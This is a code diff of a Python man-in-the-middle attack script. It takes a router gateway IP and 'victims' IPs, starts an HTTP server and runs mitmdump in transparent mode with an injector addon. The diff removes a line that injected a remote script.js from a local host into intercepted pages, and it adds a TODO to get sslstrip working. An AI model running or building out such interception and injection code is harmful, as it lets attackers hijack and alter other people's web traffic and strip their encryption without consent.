@@ -1,7 +1,9 @@
 import os
 import sys
 
-#get gateway_ip (router)
+# TODO make sslstrip work
+
+# get gateway_ip (router)
 gateway = sys.argv[1]
 print("gateway: " + gateway)
 # get victims_ip
@@ -25,7 +27,8 @@ for victim in victims:
 os.system("xterm -hold -e 'python3 httpServer.py' &")
 
 # start the mitmproxy
-os.system("~/.local/bin/mitmdump -s 'injector.py http://192.168.1.32:8000/script.js' -T")
+#os.system("~/.local/bin/mitmdump -s 'injector.py http://192.168.1.32:8000/script.js' --mode transparent")
+os.system("~/.local/bin/mitmdump -s 'injector.py' --mode transparent")
 
 
 '''
